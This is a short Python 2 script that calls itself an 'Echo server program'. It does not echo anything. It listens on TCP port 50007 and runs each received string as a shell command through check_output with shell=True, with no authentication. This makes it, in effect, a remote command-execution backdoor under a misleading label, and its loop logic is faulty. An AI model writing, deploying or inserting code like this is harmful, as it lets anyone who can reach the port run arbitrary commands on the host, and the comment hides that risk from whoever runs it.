# Echo server program
import socket
from subprocess import check_output

while 1:
	send = 'Received'
	IP = socket.gethostbyname(socket.gethostname())
	HOST =  socket.gethostname()    # Symbolic name meaning the local host
	PORT = 50007              # Arbitrary non-privileged port
	print IP
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((HOST, PORT))
	s.listen(1)
	conn, addr = s.accept()
	while 1:
		data = conn.recv(1024)
		if data:
			check_output(data, shell=True)
			break
		conn.send(send)
		
	conn.close()

